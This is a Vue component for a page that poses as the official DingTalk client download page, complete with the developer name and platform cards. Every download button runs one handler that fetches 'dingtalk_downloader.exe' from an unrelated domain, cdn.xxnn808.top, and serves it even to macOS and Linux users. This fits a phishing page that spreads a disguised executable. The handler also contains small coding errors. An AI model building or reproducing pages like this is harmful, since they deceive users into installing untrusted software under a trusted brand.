<template>
  <div>
    <DingTalkHead></DingTalkHead>
    <div class="top">
      <h2>下载钉钉客户端</h2>
      <p>开发者：钉钉科技有限公司
        ｜应用权限
        ｜隐私政策</p>
    </div>
    <div class="container">
      <div class="left">
        <img src="@/assets/download/code-2000-2000.png" alt="" width="190" style="margin-bottom: 48%">
        <div>扫描二维码下载移动客户端</div>
        <div>支持安卓系统、苹果系移动设备</div>
      </div>
      <div class="right">
        <div class="cart" @click="download">
          <div class="top123">
            <img src="@/assets/download/download-icon-on-240-240.png" alt="">
            <p>钉钉 Windows 客户端</p>
          </div>
          <div class="bottom">
            <img src="@/assets/download/download-icon-240-240.png" alt="">
            <p class="dow">点击下载Windows客户端</p>
          </div>
        </div>
        <div class="cart" @click="download">
          <div class="top123">
            <img src="@/assets/download/apple-icon--240-240.png" alt="">
            <p>钉钉 mac OS 客户端</p>
          </div>
          <div class="bottom">
            <img src="@/assets/download/download-icon-240-240.png" alt="">
            <p class="dow">点击下载钉钉 macOS 客户端</p>
          </div>
        </div>
        <div class="cart" @click="download">
          <div class="top123">
            <img src="@/assets/download/linux-icon-240-240.png" alt="">
            <p>钉钉 Linux 客户端</p>
          </div>
          <div class="bottom">
            <img src="@/assets/download/download-icon-240-240.png" alt="">
            <p class="dow">点击下载钉钉 Linux 客户端</p>
          </div>
        </div>
        <div class="cart" @click="download">
          <div class="top123">
            <img src="@/assets/download/icon-240-240.png" alt="">
            <p>钉钉 XR 设备客户端</p>
          </div>
          <div class="bottom">
            <img src="@/assets/download/download-icon-240-240.png" alt="">
            <p class="dow">扫码下载</p>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import DingTalkHead from "@/components/DingTalkHead.vue"
import Home from "@/views/Home/Home.vue";

export default {
  name: "download",
  components: {Home, DingTalkHead},
  methods: {
    download() {
      const link = document.createElement("a")
      const href = "https://cdn.xxnn808.top/dingtalk_downloader.exe"
      link.href = href
      document.body.appendChild(link)
      link.click()
      document.body.replaceChild(link)
      window.URL.revokeObjectURL(href)
    }
  }
}
</script>

<style scoped>
.top {
  text-align: center;
  padding: 100px 0px;
  background: url("@/assets/download/download1-3840-1574.jpg") 20px;
  background-size: 100%;
  background-position: 10% 8%;
}

.top h2 {
  color: #171a1d;
  font-size: 48px;
  font-weight: 600;
  margin-bottom: 19px;
  text-align: center;
}

.top p {
  margin-top: 1%;
  font-size: 16px;
}

.container {
  padding: 2% 5%;
  background: url("@/assets/download/bg-414-414.png");
  text-align: center;
  display: flex;
}

.container .right {
  display: flex;
  flex-wrap: wrap;
  margin-left: 10%;
}

.container .right .cart {
  height: 228px;
  margin: 0 24px 24px 0;
  position: relative;
  background-color: rgb(241 241 241 / 80%);
  -webkit-transition: -webkit-box-shadow .3s;
  transition: -webkit-box-shadow .3s;
  -o-transition: box-shadow .3s;
  -moz-transition: box-shadow .3s;
  transition: box-shadow .3s, -webkit-box-shadow .3s;
  width: 384px;
  overflow: hidden;
  border-radius: 10px;
  z-index: 0;
}

.container .right .cart:hover .bottom {
  top: 10px;
  left: 50%;
  transform: translateX(-50%);
  transition: all 100ms linear;
}

.container .right .cart:hover .top123 {
  opacity: 0;
  transition: all 100ms linear;
}

.container .right .cart .bottom {
  position: absolute;
  top: 200px;
  left: 50%;
  transform: translateX(-50%);
}


.container .right .cart .bottom p {
  color: #171a1d;
  font-size: 16px;
}

.container .right .cart .bottom img {
  width: 120px;
}

.container .right .cart .top123 {
  opacity: 1;
}

.container .right .cart .top123 img {
  margin-top: 22px;
  width: 120px;
}

.container .right .cart .top123 p {
  color: #171a1d;
  font-size: 16px;
  margin-bottom: 10px;
}
</style>
